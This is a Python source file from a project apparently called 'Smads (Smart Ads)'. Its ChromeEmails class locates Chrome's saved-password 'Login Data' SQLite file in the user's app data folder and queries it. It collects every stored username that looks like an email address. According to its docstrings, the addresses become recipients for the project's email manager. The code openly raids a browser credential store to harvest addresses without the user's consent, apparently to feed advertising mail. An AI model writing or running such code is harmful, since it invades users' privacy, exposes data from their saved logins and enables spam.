#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Name_Of_The_Project - Smads (Smart Ads)
Name_Of_The_Programmer - Omer Sasoni
Version - 6.0
Helped - Eldad Kapitolnik and Ori Levi
"""
import os
from sqlite3 import connect, OperationalError
import constants
import unicodedata


class ChromeEmails(object):
    """
    this class taking from the
    chrome passwords memory, all
    the emails that appear their
    """
    def __init__(self):
        """
        this function init our object
        in order to use the other functions
        that the object offer.

        Parameters
        ----------
        None
        ( in this init all the characteristics
        of the object are setting as Null
        and therefore we don't need parameters)
        """
        self.info_list = []
        self.path = None
        self.exist = None
        self.chrome_file_connection = None
        self.connect = None
        self.open = None

    def find_emails(self):
        """
        this function goes into the file
        that chrome save there the passwords
        and the emails and take from their
        only the emails in order to add them
        to our receivers in the email_mannager
        file.

        Parameters
        ----------
        None
        """
        self.getpath()
        try:
            self.chrome_file_connection = connect(
                self.path + constants.LOGIN_DATA)  # connect to the file
            with self.chrome_file_connection:
                self.connect = self.chrome_file_connection.cursor()
                cursor = self.connect.execute(
                    constants.EXECUTE)  # gets the cursor
                data_array = cursor.fetchall()  # fetching the cursor ->
                #  making it to data array

            for data in data_array:
                if "@" in data[1]:  # data[1] = username information
                    self.info_list.append(
                        unicodedata.normalize(
                            constants.UNICODE_NORMALIZED, data[1]).encode(
                            constants.ENCODE[0],
                            constants.ENCODE[1])  # unicode->str
                    )

        except OperationalError as error:
            if str(error) == constants.ERRORS[0]:  # chrome is open
                self.open = True

        return self.info_list

    def getpath(self):
        """
        this function get the path of the file
        that chrome save there the passwords
        and the emails and save her in self.path

        Parameters
        ----------
        None
        """

        self.path = os.getenv(
            constants.LOCAL_APP_DATA) + constants.PATH_TO_PASSWORDS  # path
        if not os.path.isdir(self.path):  # check if it exist
            self.exist = False
        else:
            self.exist = True
